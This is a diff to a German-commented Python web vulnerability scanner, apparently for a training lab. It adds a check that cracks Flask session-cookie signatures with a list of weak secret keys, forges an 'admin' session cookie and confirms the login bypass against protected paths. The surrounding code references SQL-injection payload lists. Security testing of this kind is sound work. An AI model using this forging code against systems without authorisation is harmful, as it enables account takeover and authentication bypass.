@@ -58,6 +58,64 @@ SQL_ERRORS = [
     "operationalerror", "programmingerror", "psycopg2", "ora-0", "odbc",
     "mysql_fetch", "pg::syntaxerror", "sqlstate", "near \"", "no such column",
 ]
+
+# ----------------------------------------------------- Session-Forgery
+# Haeufige/schwache Flask-SECRET_KEYs (inkl. Lab-Default "cowboy" aus
+# 13_session_forgery). Flask SIGNIERT den Session-Cookie nur (itsdangerous,
+# HMAC-SHA1, salt "cookie-session") und verschluesselt ihn nicht. Ist der Key
+# schwach/bekannt, laesst sich ein gueltiger Cookie mit BELIEBIGEM Inhalt bauen
+# -> freie Identitaet, Login-Pflicht umgangen.
+WEAK_SECRET_KEYS = [
+    "cowboy", "secret", "secret-key", "secretkey", "secret_key", "change-me",
+    "changeme", "CHANGEME", "dev", "development", "flask", "flask-secret",
+    "key", "keyboardcat", "password", "123456", "test", "your-secret-key",
+    "supersecret", "s3cr3t", "admin", "please-change", "insecure", "my-secret",
+]
+# Payload-Felder, die typischerweise die Identitaet tragen.
+IDENTITY_KEYS = ("user", "username", "user_id", "uid", "name", "login",
+                 "logged_in", "is_admin", "admin", "role")
+
+
+class _PlainJSONSerializer:
+    """Fallback, falls Flasks TaggedJSONSerializer fehlt (einfache Payloads)."""
+
+    @staticmethod
+    def dumps(obj):
+        return json.dumps(obj, separators=(",", ":"))
+
+    @staticmethod
+    def loads(data):
+        return json.loads(data)
+
+
+def _flask_session_serializer(secret_key):
+    """Repliziert Flasks SecureCookieSessionInterface-Signatur (itsdangerous)."""
+    import hashlib
+    from itsdangerous import URLSafeTimedSerializer
+    try:
+        from flask.json.tag import TaggedJSONSerializer
+        serializer = TaggedJSONSerializer()
+    except Exception:  # noqa: BLE001 - Flask optional, Fallback reicht fuer Lab
+        serializer = _PlainJSONSerializer()
+    return URLSafeTimedSerializer(
+        secret_key, salt="cookie-session", serializer=serializer,
+        signer_kwargs={"key_derivation": "hmac", "digest_method": hashlib.sha1},
+    )
+
+
+def _break_session_key(value, keys):
+    """(key, payload), falls ein schwacher Key die Cookie-Signatur traegt."""
+    for k in keys:
+        try:
+            return k, _flask_session_serializer(k).loads(value)
+        except Exception:  # noqa: BLE001 - falscher Key / anderes Cookie-Format
+            continue
+    return None, None
+
+
+def _forge_session(secret_key, payload):
+    """Baut einen gueltig signierten Flask-Session-Cookie mit eigenem Payload."""
+    return _flask_session_serializer(secret_key).dumps(payload)
 # Gängige SQLi-Payloads (als Feldwert eingesetzt). Decken Auth-Bypass,
 # verschiedene Quote-/Kommentar-/Klammer-Stile und numerische Kontexte ab.
 SQLI_PAYLOADS = [
@@ -148,8 +206,10 @@ class _PageParser(HTMLParser):
 
 # ============================================================ Scanner
 class Scanner:
-    def __init__(self, base, session=None, timeout=8, max_pages=25, max_targets=40):
+    def __init__(self, base, session=None, timeout=8, max_pages=25, max_targets=40,
+                 forge_user="admin"):
         self.base = base.rstrip("/")
+        self.forge_user = forge_user  # Ziel-Identitaet fuer den Session-Forgery-Check
         self.origin = urlsplit(self.base)
         self.sess = session or requests.Session()
         self.anon_sess = None   # cookie-lose Session fuer den Access-Control-Check
@@ -266,7 +326,8 @@ class Scanner:
                     self.check_access_control, self.check_sqli, self.check_xss,
                     self.check_ssti, self.check_cmdi, self.check_traversal,
                     self.check_open_redirect, self.check_cors, self.check_csrf,
-                    self.check_brute_force, self.check_session_cookie):
+                    self.check_brute_force, self.check_session_cookie,
+                    self.check_session_forgery):
             try:
                 findings.extend(chk())
             except RequestException as e:
@@ -669,6 +730,108 @@ class Scanner:
             out.append(_finding("Session-Cookie lesbar", SAFE, "keine klartext-lesbaren Cookie-Payloads"))
         return out
 
+    def check_session_forgery(self):
+        """Ist der Flask-Session-Cookie mit einem schwachen SECRET_KEY signiert,
+        laesst sich die Identitaet frei ueberschreiben -> Login-Pflicht umgangen."""
+        try:
+            import itsdangerous  # noqa: F401
+        except Exception:
+            return [_finding("Session-Forgery (schwacher SECRET_KEY)", NA,
+                             "itsdangerous nicht installiert — Check uebersprungen "
+                             "(pip install flask itsdangerous)")]
+
+        def _signed(pairs):
+            return [(n, v) for n, v in pairs
+                    if v and v.count(".") >= 1]
+
+        candidates = _signed((c.name, c.value) for c in self.sess.cookies)
+        if not candidates:
+            # Viele Apps setzen den Session-Cookie erst, wenn etwas in der Session
+            # landet (z. B. flash beim Login-Zwang-Redirect). Beim Folgen des
+            # Redirects wird er oft gleich wieder geloescht -> hier NICHT folgen
+            # und den Set-Cookie der jeweiligen Antwort direkt einsammeln.
+            probe_urls = [self.base + "/"]
+            probe_urls += [u for (u, _r, _f) in self.pages]
+            probe_urls += [lf[0] for lf in self.login_forms]
+            probe_urls += [self.base + p for p in
+                           ("/dashboard", "/profile", "/account", "/admin")]
+            seen, collected = set(), []
+            for u in probe_urls:
+                if u in seen:
+                    continue
+                seen.add(u)
+                if len(seen) > 10:
+                    break
+                try:
+                    r = self.get(u, allow_redirects=False)
+                except RequestException:
+                    continue
+                for c in getattr(r, "cookies", []) or []:
+                    collected.append((c.name, c.value))
+            candidates = _signed(collected)
+        if not candidates:
+            return [_finding("Session-Forgery (schwacher SECRET_KEY)", NA,
+                             "kein signierter Session-Cookie vorhanden")]
+
+        out = []
+        for name, value in candidates:
+            key, payload = _break_session_key(value, WEAK_SECRET_KEYS)
+            if not key:
+                out.append(_finding("Session-Forgery (schwacher SECRET_KEY)", SAFE,
+                                    f"Cookie '{name}': Signatur haelt gegen "
+                                    f"{len(WEAK_SECRET_KEYS)} gaengige Keys"))
+                continue
+            id_field = next((k for k in IDENTITY_KEYS
+                             if isinstance(payload, dict) and k in payload), None)
+            if id_field:                      # bestehendes Identitaetsfeld uebernehmen
+                forged_payload = dict(payload)
+                forged_payload[id_field] = self.forge_user
+            else:                             # sonst sauberen Minimal-Payload bauen
+                id_field = "user"
+                forged_payload = {id_field: self.forge_user}
+            forged = _forge_session(key, forged_payload)
+            out.append(_finding(
+                "Session-Forgery (schwacher SECRET_KEY)", VULN,
+                f"Cookie '{name}' mit schwachem SECRET_KEY '{key}' signiert — "
+                f"Session faelschbar. Payload: {json.dumps(payload)[:100]}; "
+                f"gefaelscht ({id_field}={self.forge_user!r}): {name}={forged[:48]}…",
+                CRIT, "/"))
+            confirm = self._confirm_forged_session(name, forged)
+            if confirm:
+                out.append(confirm)
+        return out
+
+    def _confirm_forged_session(self, name, forged):
+        """Best effort: oeffnet mit dem gefaelschten Cookie einen geschuetzten Pfad."""
+        paths = ["/dashboard", "/profile", "/account", "/admin", "/"]
+        for url, _r, _f in self.pages:          # entdeckte Pfade bevorzugen
+            pp = urlsplit(url).path
+            if pp and pp not in paths:
+                paths.insert(0, pp)
+        try:
+            probe = self.session_factory()
+            probe.cookies.set(name, forged)
+        except Exception:  # noqa: BLE001 - z. B. Fake-Session im Test
+            return None
+        for p in paths[:4]:
+            try:
+                r = probe.get(urljoin(self.base + "/", p),
+                              timeout=self.timeout, allow_redirects=False)
+            except RequestException:
+                continue
+            body = (getattr(r, "text", "") or "").lower()
+            code = getattr(r, "status_code", 0)
+            loc = (getattr(r, "headers", {}) or {}).get("Location", "").lower()
+            looks_login = ("login" in body and "password" in body) or (
+                code in (301, 302) and "login" in loc)
+            if code == 200 and not looks_login and (
+                    self.forge_user.lower() in body
+                    or "logout" in body or "dashboard" in body):
+                return _finding("Session-Forgery bestaetigt", VULN,
+                                f"gefaelschter Cookie oeffnet {p} (HTTP 200, "
+                                f"eingeloggt als {self.forge_user!r})", CRIT, p)
+        return None
+
 
 # ============================================================ Helfer
 def _benign(inp):
@@ -744,6 +907,8 @@ def main():
     ap.add_argument("--max-targets", type=int, default=40, help="max. zu fuzzende Eingabepunkte")
     ap.add_argument("--timeout", type=int, default=8, help="Request-Timeout (s)")
     ap.add_argument("--cookie", default="", help="Session-Cookie fuer authentifizierten Scan, 'name=wert'")
+    ap.add_argument("--forge-user", default="admin",
+                    help="Ziel-Identitaet fuer den Session-Forgery-Check (Default: admin)")
     args = ap.parse_args()
 
     sess = requests.Session()
@@ -751,7 +916,8 @@ def main():
         name, val = args.cookie.split("=", 1)
         sess.cookies.set(name.strip(), val.strip())
     run(args.base, session=sess, timeout=args.timeout,
-        max_pages=args.max_pages, max_targets=args.max_targets)
+        max_pages=args.max_pages, max_targets=args.max_targets,
+        forge_user=args.forge_user)
     return 0
 
 
